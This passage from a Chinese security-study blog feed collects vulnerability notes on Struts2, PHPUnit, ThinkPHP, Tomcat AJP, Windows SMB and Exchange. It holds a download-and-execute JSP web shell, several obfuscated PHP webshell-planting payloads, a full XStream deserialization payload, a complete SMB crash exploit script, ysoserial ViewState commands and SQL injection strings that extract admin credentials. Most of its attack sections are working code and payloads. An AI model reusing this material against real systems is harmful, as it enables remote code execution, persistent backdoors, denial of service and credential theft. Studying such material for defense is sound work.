&#125; else &#123;</span><br><span class="line">                    tomcatOS = DEFAULT;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.write(tomcatOS + &quot;&lt;br/&gt;&quot;);</span><br><span class="line">        response.setHeader(&quot;OS&quot;, tomcatOS);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String password = &quot;FxxkMyLie1836710Aa&quot;;</span><br><span class="line">    if (!view.equals(password)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    int systemCode = Integer.parseInt(request.getParameter(&quot;os&quot;));</span><br><span class="line">    String address = request.getParameter(&quot;address&quot;);</span><br><span class="line">    String fileName = null;</span><br><span class="line">    String path = null;</span><br><span class="line">    String winPath = &quot;%SystemRoot%/Temp/&quot;;</span><br><span class="line">    String linuxPath = &quot;/var/tmp/&quot;;</span><br><span class="line">    switch (systemCode) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">        path = winPath;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        path = linuxPath;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] urls = address.split(&quot;,&quot;);</span><br><span class="line">    InputStream fileInputSteam = null;</span><br><span class="line">    FileOutputStream fileOutputStream = null;</span><br><span class="line">    for (int i = 0; i &lt;= urls.length - 1; i++) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] file = urls[i].split(&quot;/&quot;);</span><br><span class="line">            fileName = file[file.length - 1];</span><br><span class="line">            out.write(&quot;Download:&quot; + urls[i] + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(&quot;&lt;br&gt;filename:&quot; + fileName + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(&quot;&lt;br&gt;Size:&quot; + urls.length + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(</span><br><span class="line">                    &quot;-------------------------------------------------------------------------------------------------------&quot;</span><br><span class="line">                            + &quot;&lt;br&gt;&lt;br&gt;&quot;);</span><br><span class="line">            File isfile = new File(path + fileName);</span><br><span class="line">            if (isfile.isFile()) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Runtime exec = Runtime.getRuntime();</span><br><span class="line">                    if (systemCode == 1) &#123;</span><br><span class="line">                        exec.exec(path + fileName);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        String chmod = &quot;chmod 777 &quot; + path + fileName;</span><br><span class="line">                        exec.exec(chmod);</span><br><span class="line">                        exec.exec(&quot;nohup &quot; + path + fileName + &quot; &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (Exception e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            URL downloadUrl = new URL(urls[i]);</span><br><span class="line">            HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();</span><br><span class="line">            conn.setConnectTimeout(60000 * 3);</span><br><span class="line">            conn.setReadTimeout(60000 * 3);</span><br><span class="line">            fileInputSteam = conn.getInputStream();</span><br><span class="line">            fileOutputStream = new FileOutputStream(path + fileName);</span><br><span class="line">            int length = -1;</span><br><span class="line">            byte[] b = new byte[409600];</span><br><span class="line">            while ((length = fileInputSteam.read(b)) != -1) &#123;</span><br><span class="line">                fileOutputStream.write(b, 0, length);</span><br><span class="line">                fileOutputStream.flush();</span><br><span class="line">            &#125;</span><br><span class="line">            if (conn != null) &#123;</span><br><span class="line">                conn.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">            if (fileInputSteam != null) &#123;</span><br><span class="line">                fileInputSteam.close();</span><br><span class="line">            &#125;</span><br><span class="line">            if (fileOutputStream != null) &#123;</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">            &#125;</span><br><span class="line">            Runtime exec = Runtime.getRuntime();</span><br><span class="line">            if (systemCode == 1) &#123;</span><br><span class="line">                exec.exec(path + fileName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                String chmod = &quot;chmod 777 &quot; + path + fileName;</span><br><span class="line">                exec.exec(chmod);</span><br><span class="line">                exec.exec(&quot;nohup &quot; + path + fileName + &quot; &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h1 id="CVE-2017-5638"><a href="#CVE-2017-5638" class="headerlink" title="CVE-2017-5638"></a>CVE-2017-5638</h1><p>漏洞简介</p><p>Apache Struts是一套用于创建企业级Java Web 应用的开源MVC框架 。<br>Apache Struts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。<br>漏洞编号：S2-045<br>CVE编号：CVE-2017-5638<br>漏洞类型：远程代码执行<br>漏洞级别：高危<br>漏洞风险：黑客通过利用漏洞可以实现远程命令执行。<br>影响版本：struts2.3.5 – struts2.3.31 , struts2.5 – struts2.5.10</p><h1 id="CVE-2017-9841"><a href="#CVE-2017-9841" class="headerlink" title="CVE-2017-9841"></a>CVE-2017-9841</h1><p>php unit 漏洞复现</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述:"></a>漏洞概述:</h2><p>PHPUnit 是 PHP 程式语言中最常见的单元测试 (unit testing) 框架，通常phpunit使用composer非常流行的PHP依赖管理器进行部署,将会在当前目录创建一个vendor文件夹.phpunit生产环境中仍然安装了它,如果该编写器模块存在于Web可访问目录，则存在远程代码执行漏洞。</p><h2 id="漏洞版本："><a href="#漏洞版本：" class="headerlink" title="漏洞版本："></a>漏洞版本：</h2><p>4.8.19 ~ 4.8.27<br>5.0.10 ~ 5.6.2</p><h2 id="基本原理："><a href="#基本原理：" class="headerlink" title="基本原理："></a>基本原理：</h2><p>漏洞位于<code>/phpunit/src/Util/PHP/eval-stdin.php</code>。</p><p><code>eval(&#39;?&gt;&#39;.file_get_contents(&#39;php://input&#39;));</code></p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>总体来说就是向<code>vendor/phpunit/src/Util/PHP/eval-stdin.php</code>发送POST请求执行php代码。<br>例如直接执行phpinfo在这里插入图片描述在这里插入图片描述<br>也可以直接写入一句话木马。<code>&lt;?=file_put_contents(&quot;1.php&quot;, &#39;&lt;?=eval($_REQUEST[1]);?&gt;&#39;);</code><br>在这里插入图片描述成功生成，即可菜刀连接。<br>在这里插入图片描述</p><h2 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h2><p>果断一点，生产环境中直接删掉phpunit，没有用。</p><p>如果不想删，念旧情，直接升级吧，</p><p>懒打升级？那就直接设置权限，禁止访问该目录。</p><h1 id="CVE-2017-9805-S2-052-漏洞复现"><a href="#CVE-2017-9805-S2-052-漏洞复现" class="headerlink" title="CVE-2017-9805(S2-052)漏洞复现"></a>CVE-2017-9805(S2-052)漏洞复现</h1><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache Struts2的REST插件存在远程代码执行的高危漏洞,Struts2 REST插件的XStream插件的XStream组件存在反序列化漏洞,使用XStream组件对XML格式的数据包进行反序列化操作时,未对数据内容进行有效验证,存在安全隐患,可被远程攻击。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据Content-Type或URI扩展名来判断用户传入的数据包类型</p><p>根据漏洞原理，仅需要POST相应xml数据即可不需要考虑特定的url 因此构造poc</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33</p><p>Struts 2.5 - Struts 2.5.12</p><h2 id="漏洞环境搭建以及复现"><a href="#漏洞环境搭建以及复现" class="headerlink" title="漏洞环境搭建以及复现"></a>漏洞环境搭建以及复现</h2><p>1、利用docker搭建vulhub漏洞环境</p><p>docker-compose up -d</p><p>　　</p><p>2、启动环境后,访问<code>http://172.17.0.1:8080/orders.xhtml</code>,可以看到showcase页面。</p><p>　　</p><p>3、由于rest-plugin会根据URI扩展名或 Content-Type来判断解析方法, 所以我们只需要修改orders.xhtml或修改Content-Type头为application&#x2F;xml,即可在Body中传递XML数据。</p><p>3.1点击一个edit进行编译页面,burpsuit抓包</p><p>　　</p><p>3.2修改数据包,构造数据包</p><p>将Content-Type:application&#x2F;x-www-form-urlencoded修改为:Content-Type:application&#x2F;xml</p><p>Post数据修改成:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">       &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">       &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">         &lt;dataHandler&gt;</span><br><span class="line">           &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">             &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">               &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                 &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                 &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                 &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                   &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                     &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                     &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                       &lt;command&gt;</span><br><span class="line">&lt;string&gt;touch&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/tmp/test.txt&lt;/string&gt;</span><br><span class="line">                       &lt;/command&gt;</span><br><span class="line">                       &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                     &lt;/next&gt;</span><br><span class="line">                   &lt;/iter&gt;</span><br><span class="line">                   &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                     &lt;method&gt;</span><br><span class="line">                       &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                       &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                       &lt;parameter-types/&gt;</span><br><span class="line">                     &lt;/method&gt;</span><br><span class="line">                     &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                   &lt;/filter&gt;</span><br><span class="line">                   &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                 &lt;/serviceIterator&gt;</span><br><span class="line">                 &lt;lock/&gt;</span><br><span class="line">               &lt;/cipher&gt;</span><br><span class="line">               &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">               &lt;ibuffer/&gt;</span><br><span class="line">               &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">               &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">               &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">               &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">             &lt;/is&gt;</span><br><span class="line">             &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">           &lt;/dataSource&gt;</span><br><span class="line">           &lt;transferFlavors/&gt;</span><br><span class="line">         &lt;/dataHandler&gt;</span><br><span class="line">         &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">       &lt;/value&gt;</span><br><span class="line">     &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">   &lt;/entry&gt;</span><br><span class="line">   &lt;entry&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">   &lt;/entry&gt;</span><br><span class="line"> &lt;/map&gt;</span><br></pre></td></tr></table></figure><p>4、<strong>可以看到响应500状态码,不过还是成功了</strong></p><p>　　</p><p>5、在目标执行docker-compose exec struts2 ls &#x2F;tmp&#x2F; 查看是否成功执行touch命令</p><p>　　</p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、 升级版本</p><p>2、 删除Struts2 REST插件,或仅限于服务器普通页面和jsons:</p><p><code>&lt;constant name=&quot;struts.action.extension&quot; value=&quot;xhtml,json&quot;/&gt;</code></p><p>3、限制服务端扩展类型,删除XML支持。</p><h1 id="看到的一些payload"><a href="#看到的一些payload" class="headerlink" title="看到的一些payload"></a>看到的一些payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\template\driver\file/write&amp;cacheFile=robots1.php&amp;content=xbshell&lt;?php%20@eval($_POST[admin]);?&gt;</span><br><span class="line"></span><br><span class="line">/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=12345.php&amp;vars[1][1]=&lt;?php%20$poc%20=&quot;axsxsxexrxt&quot;;$poc_1%20=%20explode(&quot;x&quot;,%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST[&#x27;12345&#x27;]))));?&gt;</span><br><span class="line"></span><br><span class="line">/?s=index/\think\template\driver\file/write&amp;cacheFile=robots.php&amp;content=xbshell1&lt;?php$password%20=%20&quot;xinba&quot;;$ch%20=%20explode(&quot;.&quot;,&quot;hello.ass.world.er.t&quot;);array_intersect_ukey(array($_REQUEST[$password]%20=&gt;%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?&gt;</span><br><span class="line"></span><br><span class="line">/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[%27fuck%27]);&amp;fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));</span><br><span class="line"></span><br><span class="line">/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294 HTTP/1.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://godkey111fw.hk1008.webhost6.cn/hmseo.txt?.php#.jpg</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;http://www.xt996.top/muggle/2020/03/23/3.23/nice.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;学习免杀工具、注册表修改时间、CVE漏洞、流量分析&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="注册表" scheme="http://example.com/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>3-20</title>
    <link href="http://example.com/2020/03/20/3.20/"/>
    <id>http://example.com/2020/03/20/3.20/</id>
    <published>2020-03-20T02:32:15.000Z</published>
    <updated>2020-03-20T10:12:21.436Z</updated>
    
    <content type="html"><![CDATA[<p>慢慢积累，慢慢学习</p><span id="more"></span><h1 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h1><p>Tomcat-Ajp协议文件读取漏洞</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><h2 id="批量扫描工具"><a href="#批量扫描工具" class="headerlink" title="批量扫描工具"></a>批量扫描工具</h2><p>python2多线程扫描Tomcat-Ajp协议文件读取漏洞<br><a href="https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner">https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip</li><li>tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性。可以通过此种特性从而可以控制request对象的下面三个Attribute属性<br>javax.servlet.include.request_uri<br>javax.servlet.include.path_info<br>javax.servlet.include.servlet_path</li><li>再通过控制ajp控制的上述三个属性来读取文件,通过操控上述三个属性从而可以读取到应用目录下的任何文件。</li></ul><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>执行poc代码，按照语法规范输入靶机IP</p><h1 id="CVE-2018-0833"><a href="#CVE-2018-0833" class="headerlink" title="CVE-2018-0833"></a>CVE-2018-0833</h1><p>SMB空指针引用攻击</p><p><a href="https://bbs.pediy.com/thread-225172.htm">https://bbs.pediy.com/thread-225172.htm</a></p><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/RealBearcat/CVE-2018-0833/blob/master/poc.py">https://github.com/RealBearcat/CVE-2018-0833/blob/master/poc.py</a><br><a href="https://www.exploit-db.com/exploits/44189">https://www.exploit-db.com/exploits/44189</a></p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>服务器信息块（SMB）是一个网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源。这个崩溃发生的模块是“mrxsmb”。这是一个微软服务器消息块(SMB)的重定向器。Windows 8.1和Windows server 2012 R2存在该漏洞，在Windows 8.1 (x86)上执行，发送一个精心构造的数据包，因为它想要从地址0x00000030的内存中读取一个受保护的(空页保护)值，该值处于受保护的内存空间，会引起内核的处理异常，迫使机器重启造成拒绝服务。</p><h2 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Exploit Title: Microsoft Windows SMB Client Null Pointer Dereference Denial of Service</span><br><span class="line"># Date: 26/02/2018</span><br><span class="line"># Exploit Author: Nabeel Ahmed</span><br><span class="line"># Version: SMBv3</span><br><span class="line"># Tested on: Windows 8.1 (x86), Windows Server 2012 R2 (x64)</span><br><span class="line"># CVE : CVE-2018-0833</span><br><span class="line"></span><br><span class="line">import SocketServer</span><br><span class="line">from binascii import unhexlify</span><br><span class="line">payload = &#x27;000000ecfd534d4241414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141&#x27;</span><br><span class="line">class byebye(SocketServer.BaseRequestHandler):</span><br><span class="line">        def handle(self):</span><br><span class="line">                try:</span><br><span class="line">                        print &quot;From:&quot;, self.client_address</span><br><span class="line">                        print &quot;[*]Sending Payload...&quot;</span><br><span class="line">                        self.request.send(unhexlify(payload))</span><br><span class="line">                except Exception:</span><br><span class="line">                        print &quot;BSoD Triggered on&quot;, self.client_address</span><br><span class="line">                        pass</span><br><span class="line">SocketServer.TCPServer.allow_reuse_address = 1</span><br><span class="line">launch = SocketServer.TCPServer((&#x27;&#x27;, 445),byebye)</span><br><span class="line">launch.serve_forever()</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>攻击机执行poc代码，靶机访问&#x2F;&#x2F;攻击机IP，靶机蓝屏</p><h1 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h1><blockquote><p><a href="https://www.freebuf.com/vuls/228735.html">https://www.freebuf.com/vuls/228735.html</a></p><p><a href="https://www.freebuf.com/vuls/228681.html">https://www.freebuf.com/vuls/228681.html</a></p></blockquote><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞产生的主要原因就是在Exchange ECP组件中发现，邮件服务在安装的过程中不会随机生成秘钥，也就是说所有默认安装的Exchange服务器中的validationKey和decryptionKey的值都是相同的，攻击者可以利用静态秘钥对服务器发起攻击，在服务器中以SYSTEM权限远程执行代码。</p><h2 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h2><p>目前github中已经有利用poc脚本：POC1,POC2，脚本的实现原理基本相同，其中都需要用到ysoserial.exe对payload进行反序列化。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>1、需要变量<br>想要利用该漏洞，我们需要四个参数，分别为：</p><p>–validationkey &#x3D; CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）</p><p>–validationalg &#x3D; SHA1（默认，漏洞产生原因）</p><p>–generator&#x3D;B97B4E27（基本默认）</p><p>–viewstateuserkey &#x3D; ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）</p><p>在这四个变量中，前两个为默认固定，viewstateuserkey和generator的值需要从经过身份验证的session中收集。viewstateuserkey可以从ASP.NET的_SessionID cookie中获取，而generator可以在一个隐藏字段__VIEWSTATEGENERATOR中找到。所有这些都可以通过浏览器中的工具轻松获取。</p><p>2、获取viewstateuserkey和generator值<br>在正常登录后访问 &#x2F;ecp&#x2F;default.aspx 页面。使用F12开发者工具的Network选项，刷新页面重新发送请求，找到登录时&#x2F;ecp&#x2F;default.aspx的原始响应。</p><p>在Headers选项卡找到ASP.NET_SessionId的cookie：</p><p>在Response选项卡搜索__VIEWSTATEGENERATOR获取字段值：</p><p>如果未找到此字段不必慌张，直接使用默认值B97B4E27 即可。</p><p>3、使用工具生成payload<br>使用ysoserial.net工具生成反序列化payload。 工具下载地址：<a href="https://github.com/pwntester/ysoserial.net/">https://github.com/pwntester/ysoserial.net/</a></p><p>生成payload命令：</p><p>ysoserial.exe-p ViewState -g TextFormattingRunProperties -c “calc.exe”–validationalg&#x3D;”SHA1”–validationkey&#x3D;”CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF”–generator&#x3D;”B97B4E27” –viewstateuserkey&#x3D;”d673d1a4-1794-403e-ab96-e283ca880ef2”–isdebug –islegacy<br>4、构造攻击地址<br>在生成完payload代码后，需要对该代码进行URL Encode编码构造一个URL</p><p>&#x2F;ecp&#x2F;default.aspx?__VIEWSTATEGENERATOR&#x3D;<generator>&amp;__VIEWSTATE&#x3D;<ViewState><br>将最开始获得的__VIEWSTATEGENERATOR值替换<generator>，将URL Encode编码后的payload替换<ViewState>。</p><h1 id="freebuf积累"><a href="#freebuf积累" class="headerlink" title="freebuf积累"></a>freebuf积累</h1><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><blockquote><p><a href="https://www.freebuf.com/articles/system/229209.html">https://www.freebuf.com/articles/system/229209.html</a></p></blockquote><h2 id="突破正则绕WAF"><a href="#突破正则绕WAF" class="headerlink" title="突破正则绕WAF"></a>突破正则绕WAF</h2><blockquote><p><a href="https://www.freebuf.com/vuls/229300.html">https://www.freebuf.com/vuls/229300.html</a></p></blockquote><h2 id="webshell隐藏"><a href="#webshell隐藏" class="headerlink" title="webshell隐藏"></a>webshell隐藏</h2><blockquote><p><a href="https://www.freebuf.com/articles/web/229649.html">https://www.freebuf.com/articles/web/229649.html</a></p></blockquote><h1 id="微博技巧"><a href="#微博技巧" class="headerlink" title="微博技巧"></a>微博技巧</h1><h2 id="网页版微博按时间排序"><a href="#网页版微博按时间排序" class="headerlink" title="网页版微博按时间排序"></a>网页版微博按时间排序</h2><p>如果网站的url链接里有”is_hot&#x3D;1”，将其改为”is_all&#x3D;1”</p><p>如果没有”is_hot&#x3D;1”，那么：</p><p>如果网页的url链接里没有”?”，就在网址最后面加上?is_all&#x3D;1</p><p>如果网页的url链接里有”?”，就在网址最后面加上&amp;is_all&#x3D;1</p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="sql盲注payload"><a href="#sql盲注payload" class="headerlink" title="sql盲注payload"></a>sql盲注payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ac=search&amp;at=taglist&amp;tagkey=ANONY%27,tags) or did&gt;1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t </span><br></pre></td></tr></table></figure><h2 id="like-regexp正则"><a href="#like-regexp正则" class="headerlink" title="like_regexp正则"></a>like_regexp正则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=5565e19cb72447479c777a99c0e39ddf&amp;sqlwhere=  and PMEMSBXQSQ_SQDW in (select CODE from PMMDDW p where p.PATH like (select PATH || &#x27;%&#x27; from PMMDDW d where d.CODE=&#x27;Z01050050020180000&#x27;))  and  PMEMSBXQSQ_XMBH=&#x27;010000503000&#x27;&amp;title=........................</span><br></pre></td></tr></table></figure><h2 id="orderbygroup排序"><a href="#orderbygroup排序" class="headerlink" title="orderbygroup排序"></a>orderbygroup排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/search.php?chid=1&amp;carsfullname=aa&amp;searchmode=subject&amp;orderby=aid and (select 1 from (select count(*),concat(&quot;Anonymous08CMS_InjTest&quot;,floor(rand(0)*2))x from information_schema.tables group by x)a)&amp;addno=0&amp;ccid8=366 </span><br></pre></td></tr></table></figure><h2 id="exists存在判断"><a href="#exists存在判断" class="headerlink" 